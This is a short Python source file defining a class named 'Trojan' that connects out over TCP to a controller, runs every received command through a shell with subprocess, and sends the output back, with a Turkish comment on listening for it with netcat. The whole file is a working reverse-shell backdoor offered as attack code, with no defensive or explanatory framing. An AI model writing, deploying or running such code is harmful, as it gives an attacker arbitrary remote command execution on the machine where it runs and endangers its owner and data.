import socket
import subprocess


class Trojan:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.link = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # SOCK_STREAM TCP dir
        self.link.connect((ip, port))  # nc -l -p 888 ile dinleyebilirsin

    def command_process(self, command):
        return subprocess.check_output(command, shell=True)

    def start(self):
        while True:
            command = self.link.recv(1024).decode("utf-8")
            data = self.command_process(command)
            self.link.send(data)

        self.link.close()


trojan = Trojan(ip="127.0.0.1", port=8080)
trojan.start()
